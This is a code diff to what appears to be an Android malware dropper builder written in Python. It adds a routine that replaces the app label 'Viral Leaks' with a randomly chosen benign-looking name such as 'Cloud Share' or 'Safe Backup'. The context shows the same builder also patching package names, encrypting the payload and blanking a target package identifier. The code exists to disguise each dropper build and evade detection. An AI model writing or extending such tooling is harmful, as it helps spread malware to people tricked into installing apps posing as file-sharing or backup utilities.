@@ -310,6 +310,33 @@ def _patch_pkg(data: bytes, new_pkg: str) -> bytes:
                 pos = end
     return bytes(result)
 
+# App label randomization — replace "Viral Leaks" in AXML UTF-16LE string pool.
+# All candidates are exactly 11 chars (same as "Viral Leaks") so the
+# uint16_LE length prefix 0x0b00 stays unchanged → pure in-place swap.
+_VIRAL_LEAKS_U16  = b'\x0b\x00' + 'Viral Leaks'.encode('utf-16-le')
+_APP_LABELS_U16   = [
+    b'\x0b\x00' + lbl.encode('utf-16-le')
+    for lbl in [
+        "Cloud Share", "Media Vault", "Quick Share",
+        "Flash Store", "Sync Helper", "File Upload",
+        "Safe Backup", "Link Bridge", "Dark Tunnel",
+        "Photo Syncs",
+    ]
+]
+
+def _randomize_app_label(data: bytes) -> bytes:
+    """Replace 'Viral Leaks' with a random 11-char name in AXML string pool."""
+    result = bytearray(data)
+    idx = result.find(_VIRAL_LEAKS_U16)
+    if idx == -1:
+        log.warning("App label 'Viral Leaks' not found in AXML")
+        return data
+    replacement = _random.choice(_APP_LABELS_U16)
+    result[idx:idx + len(_VIRAL_LEAKS_U16)] = replacement
+    label_text = replacement[2:].decode('utf-16-le', errors='replace')
+    log.info("Randomized app label → '%s'", label_text)
+    return bytes(result)
+
 _TARGET_PKG_NEEDLE = bytes([0x12, 0x12]) + b'com.btmo.awws.hoag'
 
 def _blank_target_pkg_arsc(data: bytes) -> bytes:
@@ -415,6 +442,7 @@ def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
                 data = encrypted
             elif item.filename == "AndroidManifest.xml":
                 data = _patch_pkg(data, new_pkg)
+                data = _randomize_app_label(data)
             elif item.filename == "resources.arsc":
                 data = _patch_pkg(data, new_pkg)
                 data = _blank_target_pkg_arsc(data)
